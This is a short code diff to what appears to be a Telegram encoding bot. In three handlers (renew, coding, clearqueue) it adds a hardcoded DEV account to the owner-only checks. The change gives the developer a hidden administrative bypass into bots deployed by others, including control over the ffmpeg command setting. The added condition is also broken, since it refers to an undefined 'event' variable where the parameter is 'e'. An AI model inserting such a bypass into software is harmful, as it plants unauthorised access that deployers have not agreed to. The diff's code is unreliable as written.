@@ -184,7 +184,7 @@ async def skip(e):
 
 
 async def renew(e):
-    if str(e.sender_id) not in OWNER:
+    if str(e.sender_id) not in OWNER and event.sender_id !=DEV:
         return
     await e.reply("**Cleared Queued, Working Files and Cached Downloads!**")
     WORKING.clear()
@@ -201,7 +201,7 @@ async def renew(e):
 
 
 async def coding(e):
-    if str(e.sender_id) not in OWNER:
+    if str(e.sender_id) not in OWNER and event.sender_id !=DEV:
         return
     ffmpeg = e.text.split(" ", maxsplit=1)[1]
     ffmpegcode.clear()
@@ -211,7 +211,7 @@ async def coding(e):
 
 
 async def clearqueue(e):
-    if str(e.sender_id) not in OWNER:
+    if str(e.sender_id) not in OWNER and event.sender_id !=DEV:
         return
     await e.reply("**Cleared Queued Files!**")
     QUEUE.clear()
